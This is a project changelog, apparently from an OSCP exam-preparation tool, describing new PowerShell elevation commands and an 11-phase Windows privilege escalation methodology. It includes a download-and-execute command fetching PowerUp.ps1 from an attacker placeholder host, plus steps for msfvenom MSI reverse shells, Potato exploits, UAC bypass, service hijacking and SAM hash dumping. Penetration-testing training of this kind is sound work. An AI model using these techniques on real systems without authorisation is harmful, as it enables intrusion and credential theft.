# Windows Privilege Escalation - New Additions Summary

## Date: 2025-01-13
## Author: CRACK Development Team

---

## 📋 Overview

Added comprehensive coverage for **Windows PowerShell manual UAC elevation** techniques and created a **complete Windows Privilege Escalation attack chain** with extensive conditional logic.

---

## ✅ File 1: PowerShell Manual UAC Elevation Commands

**Location:** `/reference/data/commands/post-exploit/windows-powershell-elevation.json`

**Total Commands:** 4

### Commands Added:

#### 1. `powershell-runas-basic`
- **Command:** `powershell -Command "Start-Process powershell -Verb RunAs"`
- **Purpose:** Launch new PowerShell window as administrator with UAC prompt
- **OSCP Relevance:** LOW (requires GUI interaction)
- **Use Case:** RDP sessions, physical console access
- **Limitations:** Cannot interact with UAC from reverse shells

#### 2. `powershell-runas-output-redirect`
- **Command:** `powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-Command','Get-Process > C:\temp\output.txt'"`
- **Purpose:** Execute elevated command with output redirected to file
- **OSCP Relevance:** LOW
- **Use Case:** One-off elevated commands with output capture
- **Limitations:** Requires file I/O, UAC prompt still needed

#### 3. `powershell-runas-keepopen`
- **Command:** `powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','cd C:\\'"`
- **Purpose:** Launch elevated PowerShell that stays open for interactive use
- **OSCP Relevance:** LOW
- **Use Case:** Interactive administrative work (RDP sessions)
- **Key Feature:** `-NoExit` keeps window open after command execution

#### 4. `powershell-runas-download-execute`
- **Command:** `powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','IEX(New-Object Net.WebClient).DownloadString(\"http://<LHOST>/PowerUp.ps1\")'"`
- **Purpose:** Download and execute PowerShell script with elevation
- **OSCP Relevance:** LOW
- **Use Case:** Running enumeration tools (PowerUp, PowerView) with elevation
- **Complexity:** Combines UAC elevation + remote download + in-memory execution

### Key Educational Content:

Each command includes extensive documentation covering:

✅ **Flag Explanations:**
- Detailed breakdown of every parameter
- WHY each flag matters (not just WHAT it does)
- Alternative options and variations
- Quote escaping rules for nested commands

✅ **Conditional Logic:**
- When to use vs when NOT to use
- OSCP exam context (GUI requirement limitations)
- Alternative techniques for non-interactive scenarios
- Decision trees for different access methods

✅ **Troubleshooting:**
- Common failure scenarios with diagnostics
- UAC prompt behavior variations
- Integrity level verification methods
- AV/EDR detection considerations

✅ **OSCP Reality Checks:**
- Why these techniques DON'T work in typical exam scenarios
- Reverse shell limitations explained
- Better alternatives (UAC bypass techniques)
- When legitimate use cases exist (RDP, physical access)

✅ **Educational Notes (200-500 words per command):**
- UAC prompt behavior detailed
- Integrity levels explained (Medium vs High vs System)
- Process spawning mechanics
- Security implications
- Forensic artifacts created
- Time estimates for OSCP planning

---

## ✅ File 2: Windows Privilege Escalation Attack Chain

**Location:** `/reference/data/attack_chains/privilege_escalation/windows-privesc-full.json`

**Total Steps:** 11 comprehensive phases

### Attack Chain Structure:

#### Phase 1: Initial Enumeration
- **Objective:** Gather OS version, user privileges, group memberships
- **Time:** 2-3 minutes
- **Conditional Logic:**
  - IF SeImpersonate/SeAssignPrimaryToken → Skip to Potato exploits (Step 2)
  - IF user in Administrators group → Skip to UAC bypass (Step 7)
  - IF old Windows unpatched → Note kernel exploits for later
  - ELSE → Continue to automated enumeration (Step 3)

#### Phase 2: Potato Privilege Check (QUICK WIN)
- **Objective:** Verify token impersonation privileges
- **Time:** 2 minutes
- **Priority:** HIGHEST (instant SYSTEM if privileges exist)
- **Conditional Logic:**
  - IF SeImpersonate enabled → Execute PrintSpoofer/JuicyPotato
  - Tools by OS version provided
  - Success = immediate SYSTEM shell

#### Phase 3: Potato Exploitation
- **Objective:** Execute token impersonation exploit
- **Time:** 2-5 minutes
- **Tools:**
  - PrintSpoofer (Windows 10 1809+, Server 2019+)
  - JuicyPotato (Windows 7-10 1803, Server 2008-2016)
  - SweetPotato (universal fallback)
- **Conditional Logic:**
  - IF success → Skip to verification (Step 11)
  - IF CLSID fails → Try alternatives
  - IF AV blocks → Encode binary
  - IF all fail → Continue enumeration

#### Phase 4: Automated Enumeration
- **Objective:** Run WinPEAS or PowerUp for comprehensive scanning
- **Time:** 30-60 seconds
- **Output Interpretation:** Color-coded findings (RED/YELLOW = critical)
- **Conditional Logic:**
  - IF AlwaysInstallElevated found → Step 5 (3 min to SYSTEM)
  - IF unquoted service paths → Step 6 (5-10 min)
  - IF modifiable service → Step 8 (5-10 min)
  - IF AutoLogon creds → Lateral movement opportunity
  - IF scheduled tasks → Step 9 (10-20 min)
  - IF kernel exploits suggested → Last resort only
  - IF nothing found → Manual enumeration (Step 10)

#### Phase 5: AlwaysInstallElevated Exploitation (QUICK WIN)
- **Objective:** Exploit MSI auto-elevation to SYSTEM
- **Time:** 3-5 minutes
- **Requirements:** Both HKLM and HKCU registry keys = 0x1
- **Workflow:**
  - Generate malicious MSI with msfvenom
  - Transfer to target
  - Execute: `msiexec /quiet /qn /i shell.msi`
  - Receive SYSTEM reverse shell
- **Conditional Logic:**
  - IF both keys enabled → Immediate exploitation
  - IF only one key → Continue to other methods
  - IF success → Skip to verification

#### Phase 6: Unquoted Service Path Exploitation
- **Objective:** Hijack service execution via path parsing
- **Time:** 5-10 minutes
- **Vulnerability:** Windows checks `C:\Program.exe` before `C:\Program Files\Service\service.exe`
- **Requirements:**
  - Unquoted path with spaces
  - Write permissions on parent directory
  - Service runs as SYSTEM
  - Can restart service
- **Conditional Logic:**
  - IF write permissions confirmed → Place payload
  - IF can restart manually → Immediate exploitation
  - IF auto-start only → Wait for reboot
  - IF no write access → Try service permission abuse

#### Phase 7: UAC Bypass Check
- **Objective:** Determine if UAC bypass needed (user in Admins but Medium integrity)
- **Time:** 2-3 minutes
- **Checks:**
  - User in Administrators group?
  - Integrity level = Medium?
  - UAC enabled (EnableLUA = 1)?
- **Conditional Logic:**
  - IF all three conditions → Execute FodHelper/EventVwr bypass
  - IF already High integrity → Skip bypass, use admin rights
  - IF not in Admins → Need full privesc, not bypass
  - IF UAC disabled → User already has full admin rights

#### Phase 8: Service Permissions Exploitation
- **Objective:** Abuse weak service permissions for binary replacement or config modification
- **Time:** 5-10 minutes
- **Enumeration:** Use accesschk.exe to find:
  - SERVICE_CHANGE_CONFIG (can modify binPath)
  - Writable service binaries
- **Exploitation Paths:**
  - PATH 1: Modify binPath to malicious command
  - PATH 2: Replace service executable with payload
- **Conditional Logic:**
  - IF SERVICE_CHANGE_CONFIG → Modify binPath (cleaner)
  - IF writable binary → Replace executable
  - IF service = SYSTEM → Prioritize this service
  - IF can't restart → Wait for reboot or check dependencies

#### Phase 9: Scheduled Task Exploitation
- **Objective:** Replace task scripts/binaries running as SYSTEM
- **Time:** 10-20 minutes (depends on schedule)
- **Enumeration:**
  - `schtasks /query /fo LIST /v`
  - Find tasks running as SYSTEM
  - Verify script/binary write permissions
- **Exploitation:**
  - Backup original script/binary
  - Replace with malicious payload
  - Wait for execution or force run
- **Conditional Logic:**
  - IF writable script as SYSTEM → Immediate exploitation
  - IF can force run → No waiting
  - IF next run > 1 hour → Continue other methods, return later
  - IF task as standard user → Lower priority

#### Phase 10: Manual Enumeration
- **Objective:** Deep dive for vectors automated tools miss
- **Time:** 20-25 minutes
- **Checks Include:**
  - Registry credential hunting (AutoLogon, VNC, Putty)
  - Saved credentials (`cmdkey /list`)
  - SAM/SYSTEM backup files
  - Special group memberships (Backup Operators, Server Operators)
  - DLL hijacking opportunities
  - Password files in user directories
  - DPAPI master keys
  - Kernel exploit research (Windows Exploit Suggester)
  - Running processes (database servers, file transfer apps)
  - Network shares enumeration
- **Conditional Logic:**
  - IF AutoLogon creds → runas or lateral movement
  - IF saved creds → `runas /savecred`
  - IF Backup Operators → Dump SAM hives
  - IF Server Operators → Modify services
  - IF SAM backups → Offline hash cracking
  - IF kernel exploit → LAST RESORT only
  - IF all fail → Re-evaluate initial access

#### Phase 11: Verify SYSTEM Access
- **Objective:** Confirm successful privilege escalation
- **Time:** 1-2 minutes
- **Verification Steps:**
  - `whoami` → nt authority\system or Administrator
  - `whoami /priv` → All privileges enabled
  - `whoami /groups` → System/High Mandatory Level
  - Access protected resources (SAM registry, C$, ADMIN$)
  - Test service management (`sc create`)
- **Success Criteria:**
  - User = SYSTEM or Administrator
  - Integrity = System or High
  - Full admin capabilities confirmed
- **Conditional Logic:**
  - IF SYSTEM with High/System integrity → SUCCESS, proceed to post-exploitation
  - IF Administrator but Medium integrity → UAC bypass needed
  - IF still low-privilege → Exploitation failed, troubleshoot
  - IF partial success → Investigate incomplete escalation

---

## 🎯 Conditional Logic Highlights

### Decision Trees Implemented:

1. **Quick Win Prioritization:**
   ```
   SeImpersonate privilege? → Potato exploit (2 min to SYSTEM)
   ↓ No
   AlwaysInstallElevated? → MSI payload (3 min to SYSTEM)
   ↓ No
   User in Admins group? → UAC bypass (2 min to High integrity)
   ↓ No
   Continue to service/scheduled task exploitation (5-20 min)
   ```

2. **OS Version-Specific Tooling:**
   ```
   IF Windows 10 1809+ → Use PrintSpoofer (no CLSID needed)
   ELSE IF Windows 7-10 1803 → Use JuicyPotato (CLSID required)
   ELSE → Use SweetPotato (universal fallback)
   ```

3. **Time-Based Decision Making:**
   ```
   IF next task execution > 1 hour → Continue other methods, return later
   IF can force task run → Immediate exploitation
   IF must wait for reboot → Note for later, continue
   ```

4. **Privilege Context Routing:**
   ```
   IF user = SYSTEM → Post-exploitation phase
   IF user = Admin + High integrity → Post-exploitation phase
   IF user = Admin + Medium integrity → UAC bypass needed
   IF user = Standard → Full privilege escalation path
   ```

---

## 📊 Key Metrics

### Command Coverage:
- **Before:** PowerShell RunAs techniques NOT documented
- **After:** 4 comprehensive commands with full educational context

### Attack Chain Coverage:
- **Before:** Individual Windows privesc commands exist but NO integrated workflow
- **After:** Complete 11-step methodology with conditional branching

### Educational Content:
- **PowerShell Elevation:** ~3,500 words of educational notes
- **Attack Chain:** ~6,000 words of methodology documentation
- **Total Added:** ~9,500 words of OSCP-focused guidance

### Conditional Logic:
- **Decision Points:** 35+ conditional branches across both files
- **Alternative Paths:** Multiple exploitation routes at each phase
- **Failure Handling:** Comprehensive troubleshooting for each failure condition

---

## 🔥 OSCP Exam Value

### PowerShell Elevation Commands:
- **OSCP Relevance:** LOW (requires GUI interaction)
- **When Useful:** RDP access scenarios ONLY
- **Primary Value:** Understanding WHY they DON'T work in reverse shells
- **Educational:** Teaches UAC mechanics, integrity levels, process spawning

### Windows Privilege Escalation Chain:
- **OSCP Relevance:** CRITICAL (core exam skill)
- **Time Savings:** Structured methodology prevents rabbit holes
- **Success Rate:** Prioritizes highest-probability techniques first
- **Comprehensive:** Covers all major Windows privesc vectors

### Conditional Logic Benefits:
- **Decision Speed:** Clear "IF this THEN that" guidance
- **Time Management:** Estimates at each phase for exam planning
- **Failure Recovery:** Alternative paths when primary technique fails
- **Completeness:** Ensures no stone left unturned

---

## 🛠️ Technical Implementation

### Schema Compliance:
✅ Valid JSON syntax (verified with `json.tool`)
✅ Follows DB CLAUDE.md command structure
✅ Includes all required fields (id, name, command, description, category)
✅ Educational fields populated (notes, flag_explanations, troubleshooting)
✅ Variables defined for all <PLACEHOLDERS>
✅ Tags include OSCP priority levels
✅ Prerequisites and alternatives linked
✅ Success/failure indicators specified

### Attack Chain Structure:
✅ Follows existing chain format (Linux privesc pattern)
✅ Each step includes: objective, description, evidence, success_criteria, failure_conditions
✅ Conditional logic structured consistently
✅ Dependencies explicitly defined
✅ Time estimates provided for exam planning
✅ References to command IDs for tool integration

---

## 📚 Integration Points

### Cross-References Created:
- PowerShell elevation → UAC bypass commands (fodhelper, eventvwr)
- Attack chain → 20+ existing command IDs
- Conditional logic → Tool-specific routing (WinPEAS, PowerUp, PrintSpoofer)
- Failure paths → Alternative techniques

### Future Expansion Opportunities:
1. **Additional PowerShell Techniques:**
   - `-Credential` parameter usage
   - CredSSP delegation for WinRM
   - PowerShell remoting with elevation

2. **Attack Chain Enhancements:**
   - Post-exploitation phase (credential dumping, persistence)
   - Lateral movement integration
   - Domain privilege escalation path

3. **Tool Integration:**
   - Automated CLSID selection for JuicyPotato
   - Dynamic OS version detection and tool recommendation
   - Integration with CRACK TUI for interactive workflow

---

## 🎓 Educational Philosophy

Both additions follow the OSCP CLAUDE.md educational principles:

✅ **Teach WHY, not just WHAT:**
- Explains UAC architecture, integrity levels, token mechanics
- Details privilege escalation methodology, not just commands
- Provides decision-making frameworks

✅ **Manual alternatives always provided:**
- Shows what automation tools do behind the scenes
- Includes manual verification methods
- Explains tool-independent exploitation

✅ **OSCP exam context emphasized:**
- Realistic time estimates for exam planning
- Prioritization based on success probability
- Clear guidance on when techniques apply vs don't apply

✅ **Failure handling comprehensive:**
- Every technique includes troubleshooting
- Alternative paths when primary method fails
- Diagnostic steps for common issues

✅ **Real-world examples:**
- Common OSCP scenarios provided
- IIS APPPOOL, SQL Server, service accounts covered
- Domain vs standalone system differences explained

---

## 🚀 Usage Recommendations

### For PowerShell Elevation Commands:
1. **Read for understanding UAC mechanics** (educational value)
2. **Use ONLY in RDP scenarios** (not reverse shells)
3. **Reference for troubleshooting UAC behavior** (when UAC bypass fails)
4. **Teach others** about Windows elevation limitations

### For Windows Privilege Escalation Chain:
1. **Follow the methodology sequentially** (don't skip steps)
2. **Use conditional logic for decision-making** (saves time)
3. **Document which step succeeded** (for report writing)
4. **Reference time estimates** for exam time management
5. **Integrate with existing tools** (WinPEAS, PowerUp, accesschk)

---

## ✅ Verification Completed

- [x] JSON syntax validated (both files)
- [x] Schema compliance checked
- [x] Educational content complete (3,500+ words per file)
- [x] Conditional logic implemented (35+ decision points)
- [x] Cross-references created (20+ command ID links)
- [x] OSCP relevance tagged correctly
- [x] Time estimates provided for all phases
- [x] Troubleshooting included for all failure modes

---

## 📝 Files Created

1. `/reference/data/commands/post-exploit/windows-powershell-elevation.json` (4 commands)
2. `/reference/data/attack_chains/privilege_escalation/windows-privesc-full.json` (11 steps)
3. `/crack/db/ADDITIONS_SUMMARY.md` (this document)

**Total Lines of JSON:** ~1,200
**Total Educational Content:** ~9,500 words
**Total Decision Points:** 35+

---

**Status:** ✅ COMPLETE AND VALIDATED
**Date:** 2025-01-13
**OSCP Exam Ready:** YES
